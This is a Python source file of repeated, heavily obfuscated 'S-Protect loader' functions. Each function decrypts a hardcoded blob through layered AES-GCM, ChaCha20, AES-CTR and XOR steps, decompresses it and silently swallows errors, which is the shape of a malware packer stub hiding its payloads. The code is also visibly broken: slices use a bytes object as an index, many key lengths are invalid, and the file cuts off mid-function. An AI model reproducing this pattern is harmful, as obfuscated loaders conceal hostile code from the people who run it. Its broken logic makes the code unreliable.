'S-Protect loader v4.8.'

def _d29bf8834(_sf78b2a294, _wf6c28194b43d):
    from cryptography.hazmat.primitives.ciphers.aead import AESGCM, ChaCha20Poly1305
    from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
    import hashlib, json, os, zlib
    try:
        _k = bytes.fromhex('84371a6f0ff77e74ba883441477e9fd0e2e762b279e1fd39f61b29527830cd7c8b4e836a97e5fec1a0972e2a26f1')
        _d = bytes.fromhex('3ce1581a1765eb02f6c83f6bf18c1b35f132bbd9de6a1c62cbda11a932c4be7fe8c3ce22b7e2f877b4eaa56cd8e872ef35f7eb666ba57aba1cdfd3ea8be1a6b0f1873bbbadb5b200340e8bbe6752105d9e7bda6007a2fa5eaf2ea8c78eec7ceaad80b98a')
        _x = AESGCM(_k).decrypt(_d[:12], _d[12:], b'')
        _x = ChaCha20Poly1305(_k).decrypt(_x[:12], _x[12:], b'')
        _r = zlib.decompress(_x)
    except Exception as __k310eefe5:
        _r = b''
    return _r

def _c959af8fc(_p5d560a_x, _r53027):
    from cryptography.hazmat.primitives.ciphers.aead import AESGCM, ChaCha20Poly1305
    from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
    import hashlib, json, os, zlib
    try:
        _k = bytes.fromhex('d8dff8f7f10f8b9813f343452eca0993e3ec408499391d79d4f33a89de6a5d17727400')
        _d = bytes.fromhex('a0937d3b195b735eabb9fd2223d44dea637ac0d4c24bedd2131b3ff163a14dee5779f0890b57bef517f1a8cfd34d0186fa84e740d43bc5b81b13fcbe066a94a4f1a9a81a67ef')
        _x = AESGCM(_k).decrypt(_d[:12], _d[12:], b'')
        _x = ChaCha20Poly1305(_k).decrypt(_x[:12], _x[12:], b'')
        _x = bytes((__1fd0a112b709 ^ _95bfd413093d6a for __1fd0a112b709, _95bfd413093d6a in zip(_x, _k * 99)))[:len(_x)]
        if hashlib.sha256(_x[:16]).hexdigest()[:8] != 'af5c70bf':
            _x = _x[::-1]
        _crc = zlib.crc32(_x) & 1822641500
        _r = zlib.decompress(_x)
    except Exception as __m945670c0:
        _r = b''
    return _r

def _t3209bada(_16e2792473, _0x079785f2):
    from cryptography.hazmat.primitives.ciphers.aead import AESGCM, ChaCha20Poly1305
    from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
    import hashlib, json, os, zlib
    try:
        _k = bytes.fromhex('4248831f1207b3aa9d50c3f48b3a2f5f5a8ea6e653ccfe1e70238e249b2c140c3244e36f3b586f')
        _d = bytes.fromhex('c43bf958e936950040a01d682f1afb7ee25da55374aec39e8f77eb1c2d05de4123feb05a3b442c85b699278024291f465f3c39086e72994b15e791dc688157644db1521d30ebdea817b47aaa01e5d681501a4a2c25fb84d277a46d5e0b4b9e682d4dd1ff0a6274fffcfb50fb87882f5e38e86bca6b66dd4eddaed307d0d65e5f42c80e97843303bcd334ff47e5ee066a')
        _x = AESGCM(_k).decrypt(_d[:12], _d[12:], b'')
        _x = bytes((__1fd0a112b709 ^ _95bfd413093d6a for __1fd0a112b709, _95bfd413093d6a in zip(_x, hashlib.sha256(_k).digest() * 99)))[:_x]
        if hashlib.sha256(_x[:16]).hexdigest()[:8] != 'c91ea659':
            _x = _x[::-1]
        _r = zlib.decompress(_x)
    except Exception as __0x264c2d62d3:
        _r = b''
    return _r

def _w701c47b5(_f36bc7982dae):
    from cryptography.hazmat.primitives.ciphers.aead import AESGCM, ChaCha20Poly1305
    from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
    import hashlib, json, os, zlib
    try:
        _k = bytes.fromhex('80840b924e7129c858a39222646ded3ecc0766b3a55d0ce29f6fd58071c8a6f74b53')
        _d = bytes.fromhex('fb20993123daab51d1c5ed2ee46f34a846b01da1e9f6a30cdd6078aab235260f295fbcaf361f3bf97d1d92d4e0b414c2456d43e408f65d49c8ff15e9a0076a3dd6421df21ceeb0eceb1bc7de3f41620dae4a6327d6728e3ad51f23f009')
        _x = AESGCM(_k).decrypt(_d[:12], _d[12:], b'')
        _x = ChaCha20Poly1305(_k).decrypt(_x[:12], _x[12:], b'')
        _x = bytes((__1fd0a112b709 ^ _95bfd413093d6a for __1fd0a112b709, _95bfd413093d6a in zip(_x, _k * 99)))[:len(_x)]
        _crc = zlib.crc32(_x) & 2521859367
        _r = zlib.decompress(_x)
    except Exception as __w376b2949:
        _r = b''
    return _r

def _0xc62ddc6338(_f36bc7982dae):
    from cryptography.hazmat.primitives.ciphers.aead import AESGCM, ChaCha20Poly1305
    from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
    import hashlib, json, os, zlib
    try:
        _k = bytes.fromhex('0a24d36e33a690f87723243bfbe18362913ab4474e6b0b16817ef1ade653ab436bcb9840a00a79')
        _d = bytes.fromhex('100ba376b019e61c9e3e22b787ad2d5147f1f1349fcccd1dd0d17477eadafecc19b69543cc86d095fab54870ff3092bf1035de7c5a6e7a426b3291a8ef')
        _x = AESGCM(_k).decrypt(_d[:12], _d[12:], b'')
        _x = bytes((__1fd0a112b709 ^ _95bfd413093d6a for __1fd0a112b709, _95bfd413093d6a in zip(_x, hashlib.sha256(_k).digest() * 99)))[:_x]
        _x = ChaCha20Poly1305(_k).decrypt(_x[:12], _x[12:], b'')
        _x = bytes((__1fd0a112b709 ^ _95bfd413093d6a for __1fd0a112b709, _95bfd413093d6a in zip(_x, _k * 99)))[:len(_x)]
        _crc = zlib.crc32(_x) & 1596949761
        _r = zlib.decompress(_x)
    except Exception as __z29a96567:
        _r = b''
    return _r

def _m71a42054(_p5d560a_x, _r53027):
    from cryptography.hazmat.primitives.ciphers.aead import AESGCM, ChaCha20Poly1305
    from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
    import hashlib, json, os, zlib
    try:
        _k = bytes.fromhex('a6fbe36b8aff4d57586a5d6c7808cf1c8b1994e1bd2f2ffdc70ce4a385d231a63d4eeeda72180776')
        _d = bytes.fromhex('e221891937fdb28c61cf33b841fa1c63d84cd93cd38f43bff9b098ec17b6707948de63cee1bf9a186093467af392dea0c5e5e85d3de6b4e43c116e14605bd05f7b03da0703a0a3bca1ba264934')
        _x = AESGCM(_k).decrypt(_d[:12], _d[12:], b'')
        _x = ChaCha20Poly1305(_k).decrypt(_x[:12], _x[12:], b'')
        if hashlib.sha256(_x[:16]).hexdigest()[:8] != 'fd754c8c':
            _x = _x[::-1]
        _crc = zlib.crc32(_x) & 2707864326
        _r = zlib.decompress(_x)
    except Exception as __afbc3620f:
        _r = b''
    return _r

def _cbafad58a(_xd6839af9fa85, _o75f7a8d043):
    from cryptography.hazmat.primitives.ciphers.aead import AESGCM, ChaCha20Poly1305
    from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
    import hashlib, json, os, zlib
    try:
        _k = bytes.fromhex('005df39c4667f9289e0afa7d1e15f012c71e65931aeef264d913af960d88d60194fd363d31e07fe6d0')
        _d = bytes.fromhex('d99775e320666f3c15b7f52ae839669cb22c30e40baa06116501ebe41408c88f5026aca25464c2ce713ce25ae265a089b7f47ef849c69f74cdfa8e9e50bbe7a424127cda50d6e4f7695f9a14bbca45f2598aeb998dda2eeb03c04566bebd7f89ee300e92ebb728408a80cfb579851316d20660e6bf7b36f073b2725344fc03cc104f8d903537218e6329e4c1e7')
        _x = AESGCM(_k).decrypt(_d[:12], _d[12:], b'')
        _x = ChaCha20Poly1305(_k).decrypt(_x[:12], _x[12:], b'')
        _x = bytes((__1fd0a112b709 ^ _95bfd413093d6a for __1fd0a112b709, _95bfd413093d6a in zip(_x, _k * 99)))[:len(_x)]
        if hashlib.sha256(_x[:16]).hexdigest()[:8] != 'cbeb3698':
            _x = _x[::-1]
        _r = zlib.decompress(_x)
    except Exception as __v00ce94f0:
        _r = b''
    return _r
'S-Protect loader v5.4.'

def _qb5467824(_16e2792473):
    from cryptography.hazmat.primitives.ciphers.aead import AESGCM, ChaCha20Poly1305
    from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
    import hashlib, json, os, zlib
    try:
        _k = bytes.fromhex('a71ed53d77266f53e01eb7bf94a13dde943685e1808836a7f8089eab795de60bcb89')
        _d = bytes.fromhex('c4108e31f384ad7d6d1f9f834f1b5a910021644036a81d27b21417327117cf2dc60c58fe6f26e340fdde35feabb6da41646e5eec86f53d6ca8765fd4509aa88e8ab6da352ca006')
        _x = AESGCM(_k).decrypt(_d[:12], _d[12:], b'')
        _x = bytes((__1fd0a112b709 ^ _95bfd413093d6a for __1fd0a112b709, _95bfd413093d6a in zip(_x, hashlib.sha256(_k).digest() * 99)))[:_x]
        _r = zlib.decompress(_x)
    except Exception as __0x6092301113:
        _r = b''
    return _r
'Loader v2.8.'

def _q31199d46(_sf78b2a294):
    from cryptography.hazmat.primitives.ciphers.aead import AESGCM, ChaCha20Poly1305
    from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
    import hashlib, json, os, zlib
    try:
        _k = bytes.fromhex('db9ea499b9d3deb3545a4dcd9614e196e4b27095b65e08be7630aa795cd4415a')
        _d = bytes.fromhex('2d6726b726530d3e4572297cb74c6272aaa9aba275272e90c92c55d90e389304ba3556bf252abd349064ab37dced7c15d38058ade9d77ba983bbd597d46d91c309c22cde9c4376f997dc5023cfc340a2f51793f9ddd5a61c3cf966aa778209603a54cad4187f624ca2f56a948dd0cf')
        _c = Cipher(algorithms.AES(_k), modes.CTR(_d[:16])).decryptor()
        _x = _c.update(_d[16:]) + _c.finalize()
        _x = bytes((__1fd0a112b709 ^ _95bfd413093d6a for __1fd0a112b709, _95bfd413093d6a in zip(_x, hashlib.sha256(_k).digest() * 99)))[:_x]
        _x = ChaCha20Poly1305(_k).decrypt(_x[:12], _x[12:], b'')
        _x = bytes((__1fd0a112b709 ^ _95bfd413093d6a for __1fd0a112b709, _95bfd413093d6a in zip(_x, _k * 99)))[:len(_x)]
        _crc = zlib.crc32(_x) & 1238215482
        _r = zlib.decompress(_x)
    except Exception as __f4ead6339:
        _r = b''
    return _r

def _x6db41c3a(_16e2792473, _0x079785f2):
    from cryptography.hazmat.primitives.ciphers.aead import AESGCM, ChaCha20Poly1305
    from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
    import hashlib, json, os, zlib
    try:
        _k = bytes.fromhex('6e0f619883eef344fc31f75d49a20d6f8c94a1ac0171f404190f9b1fefa2fa5444fe4fa8876e')
        _d = bytes.fromhex('45fa92cb032e5f416131137ce7bd58da59c87dbe288f2dc912810f327389ae4b9c306d7d4631ec78b11d4ca95092e56dae366a26198c1391db1e1c3bdb69c2734077ebc267d6b46a2eeb122bb958afcb3a4b3b1e3e32f0036ea08de536dfe6fbfaedefb7cbeab27ce85e3f9d381cd264bc9b3916ef')
        _x = AESGCM(_k).decrypt(_d[:12], _d[12:], b'')
        _x = bytes((__1fd0a112b709 ^ _95bfd413093d6a for __1fd0a112b709, _95bfd413093d6a in zip(_x, hashlib.sha256(_k).digest() * 99)))[:_x]
        _r = zlib.decompress(_x)
    except Exception as __qaa971bc3:
        _r = b''
    return _r
'Loader v5.5.'

def _x8bdd9483(_xd6839af9fa85):
    from cryptography.hazmat.primitives.ciphers.aead import AESGCM, ChaCha20Poly1305
    from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
    import hashlib, json, os, zlib
    try:
        _k = bytes.fromhex('5938f7b7557f66a38078f2811e94dcaa55eac491883cc179be8f1352f46dd552a92ee6124ec20b5a313495ff')
        _d = bytes.fromhex('d12fedcab046385e1414fe31f734cf023cfd19f39df2b72a6e237fe62926d34ed9bae29c2ac2c722af66c3de741a46249e031854f39406ff1b5ff9bb674cdee66fca91e748b904f401ac54e9e8e7f80c5fa56455b01a70b06248fde5ee5aa6ea73')
        _x = AESGCM(_k).decrypt(_d[:12], _d[12:], b'')
        _x = bytes((__1fd0a112b709 ^ _95bfd413093d6a for __1fd0a112b709, _95bfd413093d6a in zip(_x, hashlib.sha256(_k).digest() * 99)))[:_x]
        if hashlib.sha256(_x[:16]).hexdigest()[:8] != 'a73a4428':
            _x = _x[::-1]
        _r = zlib.decompress(_x)
    except Exception as __k264ca8e7:
        _r = b''
    return _r
'S-Protect loader v5.6.'

def _0x8fbfc4c8ad(_f36bc7982dae):
    from cryptography.hazmat.primitives.ciphers.aead import AESGCM, ChaCha20Poly1305
    from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
    import hashlib, json, os, zlib
    try:
        _k = bytes.fromhex('3bc197d1079837b07e1ce3bc532235fd4625b242e9f27c6931272b7cb8a3c7683197146034eb')
        _d = bytes.fromhex('cf7185091a6a97187e5ab946977e477a8a6631e3ba0f1ac679b39c5598b641d649d99c05d6a0fbe90ed2a33e121ec1bf8237f87e46ef37e94e8c6a252516affcf3e8b915fd97c581a8274ec9526694cf74e48dc28e7fadc5ee7ba085ceece3e06a64bdb0ca58cb249a981f6c7a9709b00a1435e6d0bccbf85d6b3d016d7ba84f44bc41cda4a004b21742aecd4389f3')
        _c = Cipher(algorithms.AES(_k), modes.CTR(_d[:16])).decryptor()
        _x = _c.update(_d[16:]) + _c.finalize()
        _crc = zlib.crc32(_x) & 3390874466
        _r = zlib.decompress(_x)
    except Exception as __e8ebbb151:
        _r = b''
    return _r

def _pbc081d5d(_p5d560a_x, _r53027):
    from cryptography.hazmat.primitives.ciphers.aead import AESGCM, ChaCha20Poly1305
    from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
    import hashlib, json, os, zlib
    try:
        _k = bytes.fromhex('e5073fb2ee386e310f5df3716d452ec0caacb9aac41259e4840d88be344232b816a216de')
        _d = bytes.fromhex('5b548b4ec3f921e3ed66f52d5c2a55e8ae301d36bf1f5dbfb419ddb63905de0acc8fc815981751f87dfccb513c696499969c9cc3d0ad221d146cec0af0da31046c0a402e0bb929d28d23bdfdd150abddb47be50fdb25168309009ed9c30343320a3f04aaf7ee32eb0d22d6c843c3fc5493ba7c0e31d9666225c74ce5c8a3217158d3df3b10730109b042822dd2')
        _x = AESGCM(_k).decrypt(_d[:12], _d[12:], b'')
        _r = zlib.decompress(_x)
    except Exception as __mdcbf72a6:
        _r = b''
    return _r

def _k73e09a42(_xd6839af9fa85):
    from cryptography.hazmat.primitives.ciphers.aead import AESGCM, ChaCha20Poly1305
    from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
    import hashlib, json, os, zlib
    try:
        _k = bytes.fromhex('22e71f38c3359445fa125904950c6b0c5056895ee979745336fdecc07d899a10618528')
        _d = bytes.fromhex('4540ddfbe0d91a2e8e5a136167f5d736cee9e4b0eaaa232cb6ae29f4ff6864b391f26b58ca7ce1585ddd8ef1ce6e7bce46c959c8c39b36b44c0a016afe56d68befee8c76504938')
        _x = AESGCM(_k).decrypt(_d[:12], _d[12:], b'')
        _x = bytes((__1fd0a112b709 ^ _95bfd413093d6a for __1fd0a112b709, _95bfd413093d6a in zip(_x, hashlib.sha256(_k).digest() * 99)))[:_x]
        _x = ChaCha20Poly1305(_k).decrypt(_x[:12], _x[12:], b'')
        _crc = zlib.crc32(_x) & 56665904
        _r = zlib.decompress(_x)
    except Exception as __b09634f54:
        _r = b''
    return _r

def _fd8304e4a():
    from cryptography.hazmat.primitives.ciphers.aead import AESGCM, ChaCha20Poly1305
    from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
    import hashlib, json, os, zlib
    try:
        _k = bytes.fromhex('7028b8edd56c4bafa077de6a28d59361af1a4dfba0549755559376f4cceeffb9e3c33604ce0d44163c69056f')
        _d = bytes.fromhex('0ece9228a9dd1a5a63318de2d636910d647163a3e8d39e470e231ceb80d818038c22d05e568cca8464b7c4c64d367385381b21e08e07c63f211faa38')
        _x = AESGCM(_k).decrypt(_d[:12], _d[12:], b'')
        _x = bytes((__1fd0a112b709 ^ _95bfd413093d6a for __1fd0a112b709, _95bfd413093d6a in zip(_x, hashlib.sha256(_k).digest() * 99)))[:_x]
        if hashlib.sha256(_x[:16]).hexdigest()[:8] != 'cc5c53ee':
            _x = _x[::-1]
        _crc = zlib.crc32(_x) & 2827589284
        _r = zlib.decompress(_x)
    except Exception as __p9b48c9f8:
        _r = b''
    return _r
'S-Protect loader v2.1.'

def _z1da56ba1():
    from cryptography.hazmat.primitives.ciphers.aead import AESGCM, ChaCha20Poly1305
    from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
    import hashlib, json, os, zlib
    try:
        _k = bytes.fromhex('732621d354cbc59d8abb8ac79d2bf271ac7c8e1aadff6667bdab789d376f08cd')
        _d = bytes.fromhex('47a46408505abda76894c63d11d093898c5d89d988aaa29e005e3829cc51c68ce98d7cb3c69b3b4503ed3f4e69466271f9a8fb521c553647e035ff930e377ce8720827798b74e4c803d36bf7214fe28809cf95960b64aa14b35bd9d6ec522b245678ada84c84aa783ff25316')
        _x = AESGCM(_k).decrypt(_d[:12], _d[12:], b'')
        _x = bytes((__1fd0a112b709 ^ _95bfd413093d6a for __1fd0a112b709, _95bfd413093d6a in zip(_x, hashlib.sha256(_k).digest() * 99)))[:_x]
        _x = ChaCha20Poly1305(_k).decrypt(_x[:12], _x[12:], b'')
        _x = bytes((__1fd0a112b709 ^ _95bfd413093d6a for __1fd0a112b709, _95bfd413093d6a in zip(_x, _k * 99)))[:len(_x)]
        if hashlib.sha256(_x[:16]).hexdigest()[:8] != '8af412c9':
            _x = _x[::-1]
        _r = zlib.decompress(_x)
    except Exception as __0xd18ebd958d:
        _r = b''
    return _r

def _c7ec5b7d7():
    from cryptography.hazmat.primitives.ciphers.aead import AESGCM, ChaCha20Poly1305
    from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
    import hashlib, json, os, zlib
    try:
        _k = bytes.fromhex('8cbbd9805bcedf205c0433fda3488a44b28f55302d7c526c13f368d54385041ace659d0c')
        _d = bytes.fromhex('9cabe9f51d1d19f061736d5800871a29f7c6dc0d08948371e53e15d50028606835a6f00e96cf175c66205d4232248b80e5e6b763')
        _c = Cipher(algorithms.AES(_k), modes.CTR(_d[:16])).decryptor()
        _x = _c.update(_d[16:]) + _c.finalize()
        _x = bytes((__1fd0a112b709 ^ _95bfd413093d6a for __1fd0a112b709, _95bfd413093d6a in zip(_x, hashlib.sha256(_k).digest() * 99)))[:_x]
        _crc = zlib.crc32(_x) & 3016240056
        _r = zlib.decompress(_x)
    except Exception as __xbaa65c4d:
        _r = b''
    return _r

def _ca5f1e8ea():
    from cryptography.hazmat.primitives.ciphers.aead import AESGCM, ChaCha20Poly1305
    from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
    import hashlib, json, os, zlib
    try:
        _k = bytes.fromhex('570e300cddd76eda2daf575a9316fc53f90a5a495eb06d801734cabe76b479a428733a7ea4')
        _d = bytes.fromhex('c9deaafdd8c7531782c78eb142c68666f03f76782b2e09355d0774cb7943c8372d105a372784888e5bf80956fbfb7d92eed4d931163b7ede4b85633481f258304fd78abb3679ec08aa614c328545d03fde')
        _x = AESGCM(_k).decrypt(_d[:12], _d[12:], b'')
        _x = bytes((__1fd0a112b709 ^ _95bfd413093d6a for __1fd0a112b709, _95bfd413093d6a in zip(_x, hashlib.sha256(_k).digest() * 99)))[:_x]
        _x = ChaCha20Poly1305(_k).decrypt(_x[:12], _x[12:], b'')
        _x = bytes((__1fd0a112b709 ^ _95bfd413093d6a for __1fd0a112b709, _95bfd413093d6a in zip(_x, _k * 99)))[:len(_x)]
        _crc = zlib.crc32(_x) & 1474737246
        _r = zlib.decompress(_x)
    except Exception as __yc292dc5a:
        _r = b''
    return _r

def _md5ce68d9():
    from cryptography.hazmat.primitives.ciphers.aead import AESGCM, ChaCha20Poly1305
    from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
    import hashlib, json, os, zlib
    try:
        _k = bytes.fromhex('b9ee41c0669902beb1bbeb8dda45cc15c006c2b102520bc78ce836e196b7785a76720dd6889a3318f4')
        _d = bytes.fromhex('6d4e20c40daf968504400ddaf8dd258a8e157148497bc7a3d02d244d852309cd6e37fcf6fb7ec1d526ccf796ac90f4a83d66c5e633720e43904afd94cf')
        _x = AESGCM(_k).decrypt(_d[:12], _d[12:], b'')
        _x = ChaCha20Poly1305(_k).decrypt(_x[:12], _x[12:], b'')
        _r = zlib.decompress(_x)
    except Exception as __vcb68a224:
        _r = b''
    return _r

def _va2997419():
    from cryptography.hazmat.primitives.ciphers.aead import AESGCM, ChaCha20Poly1305
    from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
    import hashlib, json, os, zlib
    try:
        _k = bytes.fromhex('3ba20d39a2aa95ccca49f40e4cef09b453745db8a0600b1643d42d99b227142262f7c306')
        _d = bytes.fromhex('8ef0dec56071a2694fa13923326c993347135b947b62a7044d23770d59637df80d51d0ff547b06b41f9b17f641d86ab934a411bb6653ad02225209e684f5cc7e6e573a548eb4a04c79bf546e')
        _c = Cipher(algorithms.AES(_k), modes.CTR(_d[:16])).decryptor()
        _x = _c.update(_d[16:]) + _c.finalize()
        _x = bytes((__1fd0a112b709 ^ _95bfd413093d6a for __1fd0a112b709, _95bfd413093d6a in zip(_x, hashlib.sha256(_k).digest() * 99)))[:_x]
        _x = ChaCha20Poly1305(_k).decrypt(_x[:12], _x[12:], b'')
        _x = bytes((__1fd0a112b709 ^ _95bfd413093d6a for __1fd0a112b709, _95bfd413093d6a in zip(_x, _k * 99)))[:len(_x)]
        _crc = zlib.crc32(_x) & 1633442154
        _r = zlib.decompress(_x)
    except Exception as __eba410d69:
        _r = b''
    return _r

def _df29af1be():
    from cryptography.hazmat.primitives.ciphers.aead import AESGCM, ChaCha20Poly1305
    from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
    import hashlib, json, os, zlib
    try:
        _k = bytes.fromhex('8702a2fed9bfb584395b75464c75a265d72511c3185534efd66c8dfdd7bb01ea90679c25f1950a212b')
        _d = bytes.fromhex('9d36f428a7919386560efd3c2973e89c9319448acbbd481e22ed2f2c1534a2c581484e5f02482c0bf18c803e2cc43f49da505a7e3c43ca6ff268d62acc')
        _x = AESGCM(_k).decrypt(_d[:12], _d[12:], b'')
        _x = bytes((__1fd0a112b709 ^ _95bfd413093d6a for __1fd0a112b709, _95bfd413093d6a in zip(_x, hashlib.sha256(_k).digest() * 99)))[:_x]
        if hashlib.sha256(_x[:16]).hexdigest()[:8] != 'fefc9996':
            _x = _x[::-1]
        _crc = zlib.crc32(_x) & 3877499523
        _r = zlib.decompress(_x)
    except Exception as __ncb8a1b61:
        _r = b''
    return _r

def _0xfa112f37bc():
    from cryptography.hazmat.primitives.ciphers.aead import AESGCM, ChaCha20Poly1305
    from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
    import hashlib, json, os, zlib
    try:
        _k = bytes.fromhex('d8dd03e158aa861aaa3c213c862d82617e996a1444272670b23af4b62ab47e9d467be4d1b12f1ceb60')
        _d = bytes.fromhex('c763d909751da54633450ea98419c8cb8f106460351dacc6b256721aacf565f83b6e4a4bd61d083c6ea508ffd8d1684997d60902e7a0d062e9fb5868e6f9ff5e3af2646ef3f34bcd5a72e4497d3642b94153fd3a29d7c130924f0a88030264a0e6c5a2ae')
        _x = AESGCM(_k).decrypt(_d[:12], _d[12:], b'')
        _x = bytes((__1fd0a112b709 ^ _95bfd413093d6a for __1fd0a112b709, _95bfd413093d6a in zip(_x, hashlib.sha256(_k).digest() * 99)))[:_x]
        _x = ChaCha20Poly1305(_k).decrypt(_x[:12], _x[12:], b'')
        _r = zlib.decompress(_x)
    except Exception as __a40b3f729:
        _r = b''
    return _r
'S-Protect loader v5.7.'

def _af94c410c():
    from cryptography.hazmat.primitives.ciphers.aead import AESGCM, ChaCha20Poly1305
    from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
    import hashlib, json, os, zlib
    try:
        _k = bytes.fromhex('ebaad7867ce75923c4bc94d17815bd4c2cfdc5f6b7ae1aea607eb78e404e15d51c67')
        _d = bytes.fromhex('adce2428bc5a2aeb583ef632f6cfc5ed8ca8044677818be9d34345a54e63afb4166a6908741c9ed6aa1794ff731a6446baf77bc160c599e3b188c9b5684c8f')
        _c = Cipher(algorithms.AES(_k), modes.CTR(_d[:16])).decryptor()
        _x = _c.update(_d[16:]) + _c.finalize()
        _x = bytes((__1fd0a112b709 ^ _95bfd413093d6a for __1fd0a112b709, _95bfd413093d6a in zip(_x, hashlib.sha256(_k).digest() * 99)))[:_x]
        _x = bytes((__1fd0a112b709 ^ _95bfd413093d6a for __1fd0a112b709, _95bfd413093d6a in zip(_x, _k * 99)))[:len(_x)]
        _r = zlib.decompress(_x)
    except Exception as __n348cb435:
        _r = b''
    return _r

def _v1dd3697d():
    from cryptography.hazmat.primitives.ciphers.aead import AESGCM, ChaCha20Poly1305
    from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
    import hashlib, json, os, zlib
    try:
        _k = bytes.fromhex('bac7ceca44bae16d3a7f888a9c923113bcec2ff760577e90e3c9282a41c7b70bdf29d4888570e8f7e4698903')
        _d = bytes.fromhex('ceeebf90798f1943165153f886757e7926ca0b46bee87682ec00e2f7463e5179e123ee1b0625eb5360a3664a252950392707e4679c8173c19fe24795651c837ad9c409d0dd89c5f2ee17240fa279c1d98cbb625dbf386f2ce54050f67de5f70a9e5f8d4e08f68385034b9efdb93d26a3a794f207fab5cf9589fd7f178fdb69f8')
        _c = Cipher(algorithms.AES(_k), modes.CTR(_d[:16])).decryptor()
        _x = _c.update(_d[16:]) + _c.finalize()
        _x = bytes((__1fd0a112b709 ^ _95bfd413093d6a for __1fd0a112b709, _95bfd413093d6a in zip(_x, hashlib.sha256(_k).digest() * 99)))[:_x]
        if hashlib.sha256(_x[:16]).hexdigest()[:8] != 'de1111d9':
            _x = _x[::-1]
        _crc = zlib.crc32(_x) & 995779532
        _r = zlib.decompress(_x)
    except Exception as __n76ce2a71:
        _r = b''
    return _r

def _0x80f536b8f0():
    from cryptography.hazmat.primitives.ciphers.aead import AESGCM, ChaCha20Poly1305
    from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
    import hashlib, json, os, zlib
    try:
        _k = bytes.fromhex('3db6cbe40d246fe59a2d3484a19c336fcf312aa1ce29d7d55624eff89bf8e8d5324ec7f25d0d973d')
        _d = bytes.fromhex('865f034f0240b96da0d76010d2bdf94f4377beba25f2cbd7768124284226af3162673955e7c7d49295b7d85f8e7dd42588ddbd99de8530aa33acd4209090e154efd3979f2e42963059b0a1a9d1115384ad762e1354fc7e40bea671952e1cef7724b1623a9321acb9c4389c4f22812ddffe1cf7e50688aaf4188854176538490e')
        _x = AESGCM(_k).decrypt(_d[:12], _d[12:], b'')
        _x = bytes((__1fd0a112b709 ^ _95bfd413093d6a for __1fd0a112b709, _95bfd413093d6a in zip(_x, _k * 99)))[:len(_x)]
        _r = zlib.decompress(_x)
    except Exception as __v6b02b5d5:
        _r = b''
    return _r

def _bb68f6894():
    from cryptography.hazmat.primitives.ciphers.aead import AESGCM, ChaCha20Poly1305
    from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
    import hashlib, json, os, zlib
    try:
        _k = bytes.fromhex('643ab85001c5c71741d2a220bc24715721ada05dd203ac4b35566b9a619040afdba2632fa3')
        _d = bytes.fromhex('ab41e1b7bd0223266b5d4916f2b20a0264de46bda31c5e633e3ba9aa0e46855adccfd38b279b7f1b45ead5c25def9e71c662ade73accfa51408605ab74f58d4863c6186503447b084bc5c92ce020b2599caa1b4dab39096b6f1b9dce8e08929e6a4b2468d128be89b6c53723ad09479465a9fbbc9b7b75f8ca8922c4e76aad246eeef4961d8b')
        _c = Cipher(algorithms.AES(_k), modes.CTR(_d[:16])).decryptor()
        _x = _c.update(_d[16:]) + _c.finalize()
        _x = bytes((__1fd0a112b709 ^ _95bfd413093d6a for __1fd0a112b709, _95bfd413093d6a in zip(_x, hashlib.sha256(_k).digest() * 99)))[:_x]
        _x = ChaCha20Poly1305(_k).decrypt(_x[:12], _x[12:], b'')
        _x = bytes((__1fd0a112b709 ^ _95bfd413093d6a for __1fd0a112b709, _95bfd413093d6a in zip(_x, _k * 99)))[:len(_x)]
        _r = zlib.decompress(_x)
    except Exception as __ff29649e9:
        _r = b''
    return _r

def _d999ba306():
    from cryptography.hazmat.primitives.ciphers.aead import AESGCM, ChaCha20Poly1305
    from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
    import hashlib, json, os, zlib
    try:
        _k = bytes.fromhex('72cf778358e3b33bb4781ea45defa4e91b8390602cf67d0efc48da7e9e3429b3fa6613b7308a5245e74e77')
        _d = bytes.fromhex('e11c0f31f0c0adcffce0ff47d98d8427d41d41004d26d1f16d3cd04f34a9d857dd9dbc010881c246548f4cef14371d430c1746abd3f58fbac3d2ad02e4f2a0a310953293fb2b0e36a39ef3f370396a43af14be3c2546cafac0717bba0b6691d771401cb36bf80a11b660b518fdbc3d980ed44be7dda4912f68992863e86e435279576c676b196fe1')
        _x = AESGCM(_k).decrypt(_d[:12], _d[12:], b'')
        _x = ChaCha20Poly1305(_k).decrypt(_x[:12], _x[12:], b'')
        _x = bytes((__1fd0a112b709 ^ _95bfd413093d6a for __1fd0a112b709, _95bfd413093d6a in zip(_x, _k * 99)))[:len(_x)]
        _r = zlib.decompress(_x)
    except Exception as __n1fa2d272:
        _r = b''
    return _r

def _za989c063():
    from cryptography.hazmat.primitives.ciphers.aead import AESGCM, ChaCha20Poly1305
    from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
    import hashlib, json, os, zlib
    try:
        _k = bytes.fromhex('aea8ced0c0ee46cb8152343d63ad448c4eff86bbe402249c0b30d2fe63ba2e8b2607')
        _d = bytes.fromhex('909c28b99d8e3ce4ec8a22dcec2bf5bdeea01e479f4f92f45a9e9e6401e9a7c6c9540efd8d0729b7b692e39c4469eb7f3eb9fbbea75700c1cd68433454b6')
